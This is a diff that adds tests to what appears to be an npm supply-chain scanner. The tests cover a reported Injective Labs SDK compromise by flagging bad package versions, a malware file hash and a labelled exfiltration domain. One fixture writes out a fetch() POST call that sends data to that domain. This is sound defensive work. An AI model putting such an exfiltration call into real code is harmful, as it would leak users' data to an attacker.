@@ -2255,4 +2255,90 @@ describe("Campaign Signatures", () => {
       expect(analyzeInstallCommand("npm", ["install", "paysafe-vault@1.0.3"]).blocked).toBe(true);
     });
   });
+
+  // =================================================================
+  // Injective Labs SDK npm compromise (July 8, 2026)
+  // =================================================================
+
+  describe("Injective SDK npm compromise (July 2026)", () => {
+    it("flags @injectivelabs/sdk-ts@1.20.21 as a known-bad version", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "package.json"),
+        JSON.stringify({
+          name: "consumer",
+          version: "1.0.0",
+          dependencies: { "@injectivelabs/sdk-ts": "1.20.21" },
+        })
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_BAD_VERSION"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("flags a transitively-pinned dependent (@injectivelabs/wallet-core@1.20.21)", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "package.json"),
+        JSON.stringify({
+          name: "consumer",
+          version: "1.0.0",
+          dependencies: { "@injectivelabs/wallet-core": "1.20.21" },
+        })
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_BAD_VERSION"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("does NOT flag the clean @injectivelabs/sdk-ts@1.20.23", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "package.json"),
+        JSON.stringify({
+          name: "consumer",
+          version: "1.0.0",
+          dependencies: { "@injectivelabs/sdk-ts": "1.20.23" },
+        })
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(
+        report.findings.some((f) => f.rule === "IOC_KNOWN_BAD_VERSION")
+      ).toBe(false);
+    });
+
+    it("detects the fake-telemetry exfil domain in package code", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "telemetry.js"),
+        'fetch("https://testnet.archival.chain.grpc-web.injective.network", { method: "POST", body });'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("detects the sdk-ts infostealer file hash", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "hash.txt.js"),
+        'const h = "103c4e6181151c1bcfedc41506cd1815458c38375d08a8fcd9981dbe0b965ce0";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+  });
 });
